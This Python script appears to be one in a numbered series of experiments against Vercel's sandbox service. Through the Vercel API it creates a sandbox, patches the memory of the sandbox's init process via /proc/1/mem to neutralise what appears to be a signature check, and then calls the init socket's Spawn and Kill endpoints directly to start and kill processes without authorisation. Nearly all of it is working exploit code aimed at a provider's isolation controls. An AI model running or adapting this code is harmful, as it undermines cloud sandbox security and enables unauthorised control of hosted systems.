# -*- coding: utf-8 -*-
"""实验J277: 免签 Kill 测试 (同沙箱)
A: patch
B: bg 脚本: Spawn sleep 300 -> 解析 processId -> Kill procId -> 写结果
C: ps 验证 sleep 是否被杀
"""
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    t0 = time.time()
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    dt = time.time() - t0
    print(f"=== cmd[{label}] status {c} wall={dt:.1f}s ===", flush=True)
    out = ""
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                out += d.get("data", "")
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    if out:
        print(out, flush=True)
    return out

BG_SK = r'''
import socket, sys, time, struct, json as _j

def read_all(sock, timeout=6):
    data = b""
    sock.settimeout(timeout)
    try:
        while True:
            d = sock.recv(4096)
            if not d:
                break
            data += d
            if len(data) > 60000:
                break
    except socket.timeout:
        pass
    except Exception as e:
        data += ("\nERR %s: %s" % (type(e).__name__, e)).encode()
    return data

def connect_init():
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    sock.settimeout(8)
    sock.connect("/run/vercel/share/init.sock")
    return sock

def send_http(sock, path, body, ctype):
    req = (
        b"POST " + path + b" HTTP/1.1\r\n"
        b"Host: init\r\n"
        b"Content-Type: " + ctype + b"\r\n"
        b"Connect-Protocol-Version: 1\r\n"
        b"Content-Length: " + str(len(body)).encode() + b"\r\n"
        b"Connection: close\r\n\r\n" + body
    )
    sock.sendall(req)

out = []
# 1) Spawn sleep 300
try:
    s = connect_init()
    msg = _j.dumps({"command": "/bin/sh", "arguments": ["-c", "sleep 300"],
                    "environment": []}).encode()
    body = b"\x00" + struct.pack(">I", len(msg)) + msg
    send_http(s, b"/vercel.sandbox.spawn.v1.SpawnService/Spawn", body, b"application/connect+json")
    data = read_all(s, timeout=6)
    s.close()
    out.append("SPAWN_RESP: %r" % data[:500])
    # 解析 processId
    proc = None
    import re
    m = re.search(rb'"started":\{"processId":"([^"]+)"\}', data)
    if m:
        proc = m.group(1).decode()
    out.append("PROC_ID: %s" % proc)

    if proc:
        # 2) Kill
        s2 = connect_init()
        kbody = _j.dumps({"processId": proc}).encode()
        send_http(s2, b"/vercel.sandbox.spawn.v1.SpawnService/Kill", kbody, b"application/json")
        kdata = read_all(s2, timeout=6)
        s2.close()
        out.append("KILL_RESP: %r" % kdata[:500])
except Exception as e:
    out.append("EXC %s: %s" % (type(e).__name__, e))

open("/tmp/sk.txt", "w").write("\n".join(out))
'''

NAME = "expj277"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

# A: patch
CODE_A = r'''
import os
fd = os.open("/proc/1/mem", os.O_RDWR)
def ra(a, n):
    os.lseek(fd, a, 0)
    return os.read(fd, n)
def wa(a, b):
    os.lseek(fd, a, 0)
    return os.write(fd, b)
old = ra(0x77ba00, 5)
print("OLD", old.hex(), flush=True)
if old == bytes.fromhex("4c8d6424a8"):
    wa(0x77ba00, bytes.fromhex("31c031dbc3"))
    print("PATCHED", ra(0x77ba00, 5).hex(), flush=True)
else:
    print("PATTERN_DIFF", old.hex(), flush=True)
os.close(fd)
'''
rA = run_cmd(sid, CODE_A, "A_PATCH", timeout=100)
print("A PATCHED:", "PATCHED" in (rA or ""), flush=True)

if "PATCHED" in (rA or ""):
    # B: bg spawn+kill
    CODE_B = r'''
import subprocess
open("/tmp/sk.py", "w").write(%r)
r = subprocess.Popen(
    ["setsid", "nohup", "python3", "/tmp/sk.py"],
    stdout=open("/tmp/sk.log", "w"), stderr=subprocess.STDOUT,
    stdin=subprocess.DEVNULL, close_fds=True,
)
print("sk pid", r.pid, flush=True)
''' % BG_SK
    run_cmd(sid, CODE_B, "B_BGSK", timeout=100)
    time.sleep(10)
    CODE_C = r'''
import os, subprocess
print("sk.txt exists:", os.path.exists("/tmp/sk.txt"), flush=True)
if os.path.exists("/tmp/sk.txt"):
    print(open("/tmp/sk.txt").read()[:1200], flush=True)
r = subprocess.run("ps -eo pid,ppid,uid,stat,etime,cmd | grep -v grep", shell=True, capture_output=True, timeout=8)
print((r.stdout or b"").decode("latin1", "replace"), flush=True)
'''
    run_cmd(sid, CODE_C, "C_CHECK", timeout=100)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
